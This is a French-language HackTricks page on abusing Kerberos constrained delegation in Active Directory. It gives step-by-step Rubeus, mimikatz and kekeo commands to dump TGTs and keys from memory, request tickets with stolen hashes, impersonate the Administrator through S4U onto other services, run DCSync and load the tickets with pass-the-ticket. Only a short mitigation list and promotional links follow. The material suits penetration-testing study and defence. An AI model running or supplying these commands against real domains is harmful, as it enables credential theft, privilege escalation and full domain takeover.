## Délégation restreinte

En utilisant cela, un administrateur de domaine peut permettre à un ordinateur d'usurper l'identité d'un utilisateur ou d'un ordinateur contre un service d'une machine.

* **Service pour l'utilisateur lui-même (**_**S4U2self**_**):** Si un compte de service a une valeur _userAccountControl_ contenant [TRUSTED\_TO\_AUTH\_FOR\_DELEGATION](https://msdn.microsoft.com/en-us/library/aa772300\(v=vs.85\).aspx) (T2A4D), il peut obtenir un TGS pour lui-même (le service) au nom de tout autre utilisateur.
* **Service pour l'utilisateur à travers un proxy (**_**S4U2proxy**_**):** Un compte de service pourrait obtenir un TGS au nom de n'importe quel utilisateur pour le service défini dans **msDS-AllowedToDelegateTo.** Pour ce faire, il a d'abord besoin d'un TGS de cet utilisateur vers lui-même, mais il peut utiliser S4U2self pour obtenir ce TGS avant de demander l'autre.

**Note**: Si un utilisateur est marqué comme "_Le compte est sensible et ne peut pas être délégué_" dans AD, vous ne pourrez **pas usurper son identité**.

Cela signifie que si vous **compromettez le hash du service**, vous pouvez **usurper l'identité des utilisateurs** et obtenir **l'accès** en leur nom au **service configuré** (possible **élévation de privilèges**).

De plus, vous n'aurez pas seulement accès au service que l'utilisateur est capable d'usurper, mais également à n'importe quel service, car le SPN (le nom du service demandé) n'est pas vérifié, seulement les privilèges. Par conséquent, si vous avez accès au **service CIFS**, vous pouvez également avoir accès au **service HOST** en utilisant le drapeau `/altservice` dans Rubeus.

De plus, l'accès au **service LDAP sur DC** est ce qui est nécessaire pour exploiter un **DCSync**.

{% code title="Énumérer" %}
```bash
# Powerview
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

#ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```
{% endcode %}

{% code title="Obtenir un TGT" %}
```bash
# The first step is to get a TGT of the service that can impersonate others
## If you are SYSTEM in the server, you might take it from memory
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# If you are SYSTEM, you might get the AES key or the RC4 hash from memory and request one
## Get AES/RC4 with mimikatz
mimikatz sekurlsa::ekeys

## Request with aes
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap

# Request with RC4
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
```
{% endcode %}

{% hint style="warning" %}
Il existe **d'autres moyens d'obtenir un ticket TGT** ou le **RC4** ou **AES256** sans être SYSTEM sur l'ordinateur, comme le bug de l'imprimante et la délégation non contrainte, le relais NTLM et l'abus de service de certificat Active Directory.

**En ayant simplement ce ticket TGT (ou haché), vous pouvez effectuer cette attaque sans compromettre tout l'ordinateur.**
{% endhint %}

{% code title="Utilisation de Rubeus" %}
```bash
#Obtain a TGS of the Administrator user to self
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator

#Obtain service TGS impersonating Administrator (CIFS)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS

#Impersonate Administrator on different service (HOST)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:HOST /outfile:TGS_administrator_HOST

# Get S4U TGS + Service impersonated ticket in 1 cmd (instead of 2)
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /user:dcorp-adminsrv$ /ticket:TGT_websvc.kirbi /nowrap

#Load ticket in memory
.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
```
{% endcode %}

{% code title="kekeo + Mimikatz" %}

Kekeo est un outil qui permet de manipuler les tickets Kerberos. Il peut être utilisé pour obtenir des tickets TGS pour des services que nous ne pouvons pas atteindre directement. Mimikatz peut être utilisé pour extraire les clés Kerberos des comptes d'utilisateurs. En combinant les deux outils, nous pouvons obtenir des tickets TGS pour des services que nous ne pouvons pas atteindre directement et extraire les clés Kerberos pour ces services. Nous pouvons ensuite utiliser ces clés pour accéder aux services en question.

Voici les étapes à suivre pour utiliser kekeo et Mimikatz pour la délégation contrainte :

1. Utilisez kekeo pour obtenir un ticket TGS pour le service cible :

```
kekeo.exe tgt::ask /user:USER /domain:DOMAIN /rc4:HASH /ticket:ticket.tgt
kekeo.exe tgs::s4u /tgt:ticket.tgt /user:USER /service:SERVICE /rc4:HASH /ticket:ticket.tgs
```

2. Utilisez Mimikatz pour extraire la clé Kerberos du compte de service cible :

```
mimikatz.exe "privilege::debug" "lsadump::dcsync /user:SERVICE$"
```

3. Utilisez kekeo pour obtenir un ticket TGS pour le service cible en utilisant la clé Kerberos extraite :

```
kekeo.exe tgs::s4u /tgt:ticket.tgt /user:USER /service:SERVICE /krbkey:HASH /ticket:ticket.tgs
```

4. Utilisez le ticket TGS obtenu pour accéder au service cible :

```
klist.exe purge
klist.exe import /ticket:ticket.tgs
```

Maintenant, nous avons accès au service cible en utilisant la délégation contrainte.
```bash
#Obtain a TGT for the Constained allowed user
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d

#Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)
tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLAR CORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL

#Load the TGS in memory
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'  
```
{% endcode %}

### Atténuation

* Désactiver la délégation Kerberos lorsque cela est possible
* Limiter les connexions DA/Admin aux services spécifiques
* Définir "Le compte est sensible et ne peut pas être délégué" pour les comptes privilégiés.

[**Plus d'informations sur ired.team.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !

- Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)

- **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Partagez vos astuces de piratage en soumettant des PR au [repo hacktricks](https://github.com/carlospolop/hacktricks) et au [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
